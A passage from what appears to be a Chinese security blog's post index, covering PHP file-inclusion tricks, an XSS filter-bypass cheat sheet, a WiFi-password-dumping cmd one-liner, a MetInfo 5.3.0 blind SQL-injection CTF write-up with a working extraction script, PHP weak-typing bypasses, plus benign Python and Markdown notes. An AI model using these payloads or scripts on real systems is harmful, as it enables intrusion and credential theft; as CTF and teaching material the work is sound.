<h3 id="0x06-5-PHP内置协议"><a href="#0x06-5-PHP内置协议" class="headerlink" title="0x06_5 PHP内置协议"></a>0x06_5 PHP内置协议</h3><pre><code>file:///var/www/html  访问本地文件系统
ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs
data://  数据流
http:// — 访问 HTTP(s) URLs
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流
zlib:// — 压缩流
data:// — Data (RFC 2397)
glob:// — 查找匹配的文件路径模式
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — 处理交互式的流
</code></pre><h3 id="0x06-6-包含Session文件。"><a href="#0x06-6-包含Session文件。" class="headerlink" title="0x06_6 包含Session文件。"></a>0x06_6 包含Session文件。</h3><p>这部分需要攻击者能够控制部分Session文件的内容，PHP默认生成的Session文件一般存放在/tmp目录下。</p>
<h3 id="0x06-7-包含-proc-self-environ文件。"><a href="#0x06-7-包含-proc-self-environ文件。" class="headerlink" title="0x06_7 包含/proc/self/environ文件。"></a>0x06_7 包含/proc/self/environ文件。</h3><blockquote>
<p><a href="http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ" target="_blank" rel="external">http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ</a></p>
</blockquote>
<p>这个也是一种通用的技巧，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容，常见的做法是向User-Agent中注入PHP代码来完成攻击。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>强力推荐一篇文章：<a href="http://www.cnblogs.com/littlehann/p/3665062.html" target="_blank" rel="external">LFI、RFI、PHP封装协议安全问题学习</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> PHP </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS绕过与防御总结]]></title>
      <url>/2016/07/18/XSS%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
<a id="more"></a>
<h1 id="0x01-XSS的分类"><a href="#0x01-XSS的分类" class="headerlink" title="0x01 XSS的分类"></a>0x01 XSS的分类</h1><ul>
<li>反射型（非持久型）</li>
<li>存储型（持久型）</li>
<li>DOM型</li>
</ul>
<p>具体的一些介绍与简单的实例就不做详述了，本文主要介绍的是XSS的绕过技巧与防御。</p>
<h1 id="0x02-XSS的绕过"><a href="#0x02-XSS的绕过" class="headerlink" title="0x02 XSS的绕过"></a>0x02 XSS的绕过</h1><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre><code>&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt;
</code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre><code>1.十六进制编码

2.jsfuck编码

3.url编码

4.unicode编码

    &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt;
    &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; 
    &apos;被过滤，我们可以将&apos;写为 &amp;#x27
    将&quot;/&quot;转义为&quot;&amp;sol;&quot;
</code></pre><h3 id="绕过magic-quotes-gpc"><a href="#绕过magic-quotes-gpc" class="headerlink" title="绕过magic_quotes_gpc"></a>绕过magic_quotes_gpc</h3><pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 
</code></pre><h3 id="闭合标签"><a href="#闭合标签" class="headerlink" title="闭合标签"></a>闭合标签</h3><pre><code>&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;

&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 
</code></pre><h3 id="标签绕过"><a href="#标签绕过" class="headerlink" title="标签绕过"></a>标签绕过</h3><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;
&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;
&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;
&quot;onsubmit=javascript:alert(1)%20name=&quot;a
</code></pre><h3 id="其他符号绕过"><a href="#其他符号绕过" class="headerlink" title="其他符号绕过"></a>其他符号绕过</h3><pre><code>%0aalert(1);   %0a  换行符
/**/            替换空格
%00                截断
</code></pre><h3 id="双字母绕过"><a href="#双字母绕过" class="headerlink" title="双字母绕过"></a>双字母绕过</h3><pre><code>&lt;img ononerrorerror=&quot;123&quot;&gt;
&lt;script&gt;alalertert(123)&lt;/script&gt;
</code></pre><h3 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h3><pre><code>gbxxxx系列的编码，那么我们尝试一下宽字节  %c0 %bf  %5c
</code></pre><h3 id="其他事件绕过"><a href="#其他事件绕过" class="headerlink" title="其他事件绕过"></a>其他事件绕过</h3><pre><code>onload
onclick
onerror
prompt
confirm
onmousemove
</code></pre><h3 id="CRLF-injection绕过"><a href="#CRLF-injection绕过" class="headerlink" title="CRLF injection绕过"></a>CRLF injection绕过</h3><pre><code>CRLF是”回车 + 换行”（\r\n）的简称。
http://www.xxx.com%0d%0a%0d%0a+xss代码

&lt;svg/onload=prompt(1)&gt;
</code></pre><h1 id="0x03-XSS的防御"><a href="#0x03-XSS的防御" class="headerlink" title="0x03 XSS的防御"></a>0x03 XSS的防御</h1><ul>
<li><p>原则1：“Secure By Default”原则：不要往HTML页面中插入任何不可信数据</p>
</li>
<li><p>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</p>
</li>
<li><p>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</p>
</li>
<li><p>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</p>
</li>
<li><p>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</p>
</li>
<li><p>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</p>
</li>
<li><p>原则7：使用富文本时，使用XSS规则引擎进行编码过滤</p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> CRLF </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python练习题]]></title>
      <url>/2016/07/16/python%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>两个python练习的小脚本，涉及正则表达式，网页爬虫及信息提取。<br><a id="more"></a></p>
<h1 id="习题1：从文本中匹配英文单词"><a href="#习题1：从文本中匹配英文单词" class="headerlink" title="习题1：从文本中匹配英文单词"></a>习题1：从文本中匹配英文单词</h1><p>代码：</p>
<pre><code>#!usr/bin/python
#coding=utf-8
&apos;&apos;&apos;
@author：w2n1ck

&apos;&apos;&apos;
import re
#载入正则表达式模块
f1 = open(&apos;from.txt&apos;)
data = f1.read()
f1.close()
#打开文件，读入文本
result = re.findall(&apos;[A-z]+&apos;, data)
#用正则表达式中的findall方法
#找出data中所有从A-Za-z的连续字符
result.sort()
#把得到的结果字符串list排序，默认为字典序
data = &apos;\n&apos;.join(result)
#把排序后的结果用换行符连接成一段文本
f2 = open(&apos;to.txt&apos;, &apos;w&apos;)
f2.write(data)
f2.close()
#输出到文件中
</code></pre><p><code>from.txt</code>内容如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D_1.png" alt=""></p>
<p>结果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D_2.png" alt=""></p>
<h1 id="习题2：-查询热映电影"><a href="#习题2：-查询热映电影" class="headerlink" title="习题2： 查询热映电影"></a>习题2： 查询热映电影</h1><p>查询当前正在热映的电影。方法是，找一个电影网站（豆瓣电影、时光网、格瓦拉等等），把它的首页取过来，分析一下网页内容的结构，然后从中取出你要的信息。</p>
<p>因为一个网页上会包含很多内容，如何查找定位到你所需的内容，还是要费点功夫的。你可能会用到正则表达式、urllib，或者BeautifulSoup之类的。</p>
<p>首先安装第三方的网页分析模块：<code>BeautifulSoup</code></p>
<p>代码：</p>
<pre><code>#!usr/bin/python
#coding:utf-8
&apos;&apos;&apos;
@author：w2n1ck

&apos;&apos;&apos;
import urllib2
from bs4 import BeautifulSoup
print &quot;豆瓣正在热映：&quot;
url = &quot;http://movie.douban.com&quot;
html = urllib2.urlopen(url).read()
soup = BeautifulSoup(html)
div_hot = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;screening&quot;})
for i in div_hot.find_all(&apos;li&apos;, class_=&apos;title&apos;):
    movie_title = i.a.get_text()
#   movie_title = movie_title.strip() #去除movie_title两边的空格
    print movie_title

print &quot;\n豆瓣近期热门：&quot;
div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;hot-gallery&quot;})
for i in div_new.find_all(&apos;li&apos;, class_=&apos;title&apos;):
    movie_new = i.a.get_text()
    print movie_new
</code></pre><p>代码解析：</p>
<ul>
<li><p>7、8行分别导入了urllib2、beautifulsoup模块</p>
</li>
<li><p>11行用urllib模块把豆瓣的网页抓下来</p>
</li>
<li><p>12行用BeautifulSoup模块整理抓下来的html内容</p>
</li>
<li><p>13行是重点，把我们需要的那一部分div截取下来（id=”screening”的那部分），需要分析html源码。</p>
</li>
<li><p>接下来在上文的div中，寻找所有 class=”title” 的 li 元素，注意，由于 <code>class_</code>是python中的保留关键字，所以需要 <code>class_=&#39;title&#39;</code>。</p>
</li>
<li><p>有些网页抓取出来的内容前后有很多空格，可以用.strip() 去除。</p>
</li>
</ul>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%9F%A5%E6%89%BE%E7%83%AD%E9%97%A8%E7%94%B5%E5%BD%B1.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CMD命令获取电脑所有连接过的WiFi密码]]></title>
      <url>/2016/07/16/CMD%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84WiFi%E5%AF%86%E7%A0%81/</url>
      <content type="html"><![CDATA[<p>CMD平常人看起來根本没什么用，但是如果你会使用，你会发现：它真的很强大！<br><a id="more"></a></p>
<p>Windows 7、Windows 8、Windows 8.1、Windows 10已测试成功！（windows 7下以管理员方式运行）</p>
<h1 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h1><p>一、以管理员权限运行CMD （以及 开启无线网卡、最好是笔记本）</p>
<p>二、输入命令：</p>
<blockquote>
<p> for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</p>
</blockquote>
<p>三、然后CMD就列出很多行 你以前连接过的wifi信息、加密方式、包括密码</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/WIFI%E5%AF%86%E7%A0%81.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实验吧综合渗透_metinfo_盲注脚本]]></title>
      <url>/2016/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F-metinfo-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>MetInfo5.3.0 版本SQL注入。在本地搭建环境，分析如下:</p>
<p>这个漏洞主要是listmod.php，代码的最后一行<code>$serch_sql</code> 怎么做能让这个没有在上面给初始化，这就是我们要做的。<br><a id="more"></a></p>
<p>通过调试：</p>
<p>我们的知 控制它是否初始化的另一个变量为imgproduct</p>
<p>当这个变量非search的任意字符的时候，导致serch_sql 不能进行初始化</p>
<p><strong>构造POC：</strong></p>
<blockquote>
<p><a href="http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as" target="_blank" rel="external">http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as</a> a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1– sd&amp;imgproduct=xxxx</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/metinfo_Blind_Injection_1.png" alt=""></p>
<p>这样一来 比sql注入更为简单了97那个位置，然后在判断第二位，再穷聚,自然就爆表了。</p>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>实验吧综合渗透metinfo。</p>
<p>本题环境就是这个，根据POC写如下脚本：</p>
<pre><code># -*- coding: utf8 -*-
import httplib
import requests
import urllib
import string

payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;

url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot;

password = &apos;&apos;

for p in range(1, 33):

    for num in payloads:

        num = ord(num)

        poc = &quot;http://localhost:8080/MetInfo_v5.3.0/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot;

        #print poc

        #result = urllib.request.urlopen(poc).txt

        conn = requests.get(poc)

        res = conn.content

        res = str(res)

        if res.find(r&quot;为什么企业要建多国语言网站&quot;)&gt;0:

            password = password + chr(num)

            print password

            break
</code></pre><p>测试效果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/metinfo_blind_injection_2.png" alt=""></p>
<p>根据如上脚本跑出账户密码为：</p>
<blockquote>
<p>acd131fce58f4d6f86e4a503a303fa4e   simpleware123</p>
</blockquote>
<p>这个要收费，附一个MD5解密的免费网址：<code>http://www.pdtools.net/tools/md5.jsp</code></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> 自动化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MarkDown基础语法]]></title>
      <url>/2016/07/13/MarkDown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="Markdown入门学习小结"><a href="#Markdown入门学习小结" class="headerlink" title="Markdown入门学习小结"></a>Markdown入门学习小结</h1><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown 的目标是实现「易读易写」。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在Markdown当中设置标题，有两种方式：</p>
<ul>
<li>第一种：通过在文字下方添加“=”和“-”，他们分别表示一级标题和二级标题。</li>
<li>第二种：在文字开头加上 “#”，通过“#”数量表示几级标题。（一共只有1~6级标题，1级标题字体最大）</li>
</ul>
<h2 id="块注释-引用"><a href="#块注释-引用" class="headerlink" title="块注释(引用)"></a>块注释(引用)</h2><ul>
<li>通过在文字开头添加“&gt; ”表示块注释。</li>
</ul>
<h2 id="粗体（强调）"><a href="#粗体（强调）" class="headerlink" title="粗体（强调）"></a>粗体（强调）</h2><ul>
<li>将需要设置为粗体的文字两端使用2个“*”。</li>
</ul>
<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><ol>
<li>使用数字</li>
<li>后面跟上句号。</li>
<li>（还要有空格）</li>
</ol>
<h2 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h2><p>Markdown中有两种方式，实现链接，分别为内联方式和引用方式。</p>
<p>内联方式：This is an <a href="http://example.com/" target="_blank" rel="external">example link</a>.</p>
<p><code>This is an [example link](http://example.com/).</code></p>
<h2 id="图片（Images）"><a href="#图片（Images）" class="headerlink" title="图片（Images）"></a>图片（Images）</h2><p>图片的处理方式和链接的处理方式，非常的类似。</p>
<ul>
<li>内联方式：<img src="C:\Users\dell\Pictures\404.jpg" alt="test"></li>
<li><code>![test](C:\Users\dell\Pictures\404.jpg)</code></li>
<li>直接使用<img>标签，这样可以指定图片的大小尺寸<h2 id="代码（HTML中所谓的Code）"><a href="#代码（HTML中所谓的Code）" class="headerlink" title="代码（HTML中所谓的Code）"></a>代码（HTML中所谓的Code）</h2>实现方式有两种：<br>第一种：简单文字出现一个代码框。使用<code>&lt;blockquote&gt;</code>。（<code>不是单引号而是左上角的ESC下面~中的</code>）<br>```<br>第二种：大片文字需要实现代码框。使用Tab和四个空格。<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><blockquote>
<p>用\转义。</p>
</blockquote>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> MarkDown </tag>
            
            <tag> 博客 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【PHP安全】PHP弱类型]]></title>
      <url>/2016/06/13/%E3%80%90PHP%E5%AE%89%E5%85%A8%E3%80%91PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<p>没有人质疑php的简单强大，它提供了很多特性供开发者使用，其中一个就是弱类型机制。<br>弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。<br><a id="more"></a></p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><hr>
<h1 id="PHP弱类型简介"><a href="#PHP弱类型简介" class="headerlink" title="PHP弱类型简介"></a>PHP弱类型简介</h1><p>在PHP中，可以进行一下的操作。</p>
<pre><code>$param = 1;

$param = array();

$param = &quot;stringg&quot;;
</code></pre><p>比如 在$a == $b的比较中</p>
<ul>
<li>$a = null; $b = false; //为真</li>
<li>$a = ‘’; $b = 0; //同样为真<h1 id="实例解释"><a href="#实例解释" class="headerlink" title="实例解释"></a>实例解释</h1></li>
</ul>
<hr>
<h2 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h2><p>2016年风云杯的题</p>
<p>题目就是一个登陆框，需要输入账号密码。</p>
<p>post：username[]=1&amp;password[]=2</p>
<p><strong>原因是：</strong>用户在输入账号密码之后php会进行解析，首先会把username和password当成数组，username和password再MD5加密之后就变得和数据库中相同，这样就成功登陆。</p>
<h2 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h2><p>也是2016年风云杯的题</p>
<ul>
<li>首先一个备份文件，拿到源码</li>
</ul>
<p>代码如下：<br>    &lt;?php<br>        $_GET[‘myid’] = urldecode($_GET[‘myid’]);<br>        $flag = ‘xxxxxxxxxxxxxxxxx’;<br>        if (isset($_GET[‘name’]) and isset($_POST[‘password’])) {</p>
<pre><code>        if ($_GET[&apos;name&apos;] == $_POST[&apos;password&apos;])

            print &apos;Your password can not be your name.&apos;;

        else if (sha1($_GET[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])&amp;($_GET[&apos;myid&apos;]==&apos;anyun&apos;))

            die(&apos;Flag: &apos;.$flag);

    else

    print &apos;sorry!&apos;;

    }
?&gt;
</code></pre><ul>
<li>首先对myid进行一个urldecode</li>
<li>然后判断是否设置name和password</li>
<li>再然后判断sha1（name）和sha1（password）是否相等，并且myid=anyun</li>
<li>最后输出flag<br>根据对源码分析，构造如下payload：<blockquote>
<p><a href="http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1" target="_blank" rel="external">http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1</a></p>
<p>post：password[]=2<br>这样就绕过了，具体的原因就不一一解释了。</p>
</blockquote>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>作为一个程序员，弱类型确实给程序员书写代码带来了很大的便利，但是也让程序员忘记了<br>$array =array();的习惯。<br>都说一切输入都是有害的</p>
<p>那么其实可以说一切输入的类型也是可疑的，永远不要相信弱类型的php下任何比较函数，任何数学运算。否则，你绝对是被php出卖的那一个。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF之加解密总结]]></title>
      <url>/2016/05/25/CTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>CTF比赛中主要分为逆向破解，Web安全，加密解密，PWN等几大类，本文主要总结一些自己做过的ctf的以下加密解密的方法和工具等。<br><a id="more"></a></p>
<h1 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h1><p>Base64顾名思义就是用64个可显示字符表示所有的ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（3<em>8=24）转化为4个6位的字节（4</em>6=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现1或2个’=’<br>内存1个字符占8位</p>
<h2 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h2><pre><code>转前： s 1 3
先转成ascii：对应 115 49 51
2进制： 01110011 00110001 00110011
6个一组（4组） 011100110011000100110011
然后才有后面的 011100 110011 000100 110011
然后计算机是8位8位的存数 6不够，自动就补两个高位0了
所有有了 高位补0
科学计算器输入 00011100 00110011 00000100 00110011
得到 28 51 4 51
查对下照表 c z E z
</code></pre><h2 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h2><blockquote>
<p>ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY=</p>
<h3 id="Base64在线编码解码地址"><a href="#Base64在线编码解码地址" class="headerlink" title="Base64在线编码解码地址"></a><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="external">Base64在线编码解码地址</a></h3><h1 id="0x02-Base32"><a href="#0x02-Base32" class="headerlink" title="0x02 Base32"></a>0x02 Base32</h1><p>Base32和Base64相比只有一个区别就是，用32个字符表示256个ASC字符，也就是说5个ASC字符一组可以生成8个Base字符。</p>
<h3 id="Base32在线编码解码地址"><a href="#Base32在线编码解码地址" class="headerlink" title="Base32在线编码解码地址"></a><a href="http://tomeko.net/online_tools/base32.php?lang=en" target="_blank" rel="external">Base32在线编码解码地址</a></h3><p><strong>注：</strong>以上两种编码都可以使用python的base64模块来加解密</p>
</blockquote>
<h1 id="0x03-培根密码"><a href="#0x03-培根密码" class="headerlink" title="0x03 培根密码"></a>0x03 培根密码</h1><p>培根密码，培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b<br>密文形式是明显两个不同的字符。如大写字母和小写字母，英文和数字，斜体和正体。</p>
<h2 id="例如-1"><a href="#例如-1" class="headerlink" title="例如"></a>例如</h2><pre><code>DEath IS JUST A PaRT oF lIFE,sOMeTHInG wE&apos;RE aLL dESTInED TO dO.

是大写小写两个不同的字符
大写用a表示，小写用b表示
选取5个一组
DEath aabbb    
ISJUS aaaaa 
TAPaR aaaba 
ToFlI ababa 
FEsOM aabaa 
eTHIn baaab 
GwERE abaaa 
aLLdE baaba
STInE aaaba 
DTOdO aaab
按照上述的形式去在表里找对应得明文.
</code></pre><ul>
<li><p>第一种方式</p>
<p>  A aaaaa    B aaaab C aaaba D aaabb<br>  E aabaa F aabab G aabba H aabbb<br>  I abaaa J abaab K ababa L ababb<br>  M abbaa N abbab O abbba P abbbb<br>  Q baaaa R baaab S baaba T baabb<br>  U babaa V babab W babba X babbb<br>  Y bbaaa Z bbaab</p>
</li>
<li><p>第二种方式</p>
<p>  a AAAAA g AABBA n ABBAA t BAABA<br>  b AAAAB h AABBB o ABBAB u-v BAABB<br>  c AAABA i-j ABAAA p ABBBA w BABAA<br>  d AAABB k ABAAB q ABBBB x BABAB<br>  e AABAA l ABABA r BAAAA y BABBA<br>  f AABAB m ABABB s BAAAB z BABBB</p>
</li>
</ul>
<h3 id="培根密码在线解密"><a href="#培根密码在线解密" class="headerlink" title="培根密码在线解密"></a><a href="http://114.215.92.217/blog/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html" target="_blank" rel="external">培根密码在线解密</a></h3><h1 id="0x04-摩斯密码"><a href="#0x04-摩斯密码" class="headerlink" title="0x04 摩斯密码"></a>0x04 摩斯密码</h1><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
<blockquote>
<p>形如：–  —  .-.  …  .</p>
</blockquote>
<p>解密对照下图摩斯密码表:</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%91%A9%E6%96%AF%E5%AF%86%E7%A0%81%E8%A1%A8.png" alt=""></p>
<h3 id="在线摩斯密码解密"><a href="#在线摩斯密码解密" class="headerlink" title="在线摩斯密码解密"></a><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="external">在线摩斯密码解密</a></h3><h1 id="0x05-JsFuck"><a href="#0x05-JsFuck" class="headerlink" title="0x05 JsFuck"></a>0x05 JsFuck</h1><p>JSFuck 可以让你只用 6 个字符 <a href=""></a>!+ 来编写 JavaScript 程序。</p>
<h3 id="形式："><a href="#形式：" class="headerlink" title="形式："></a>形式：</h3><blockquote>
<p>[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])<a 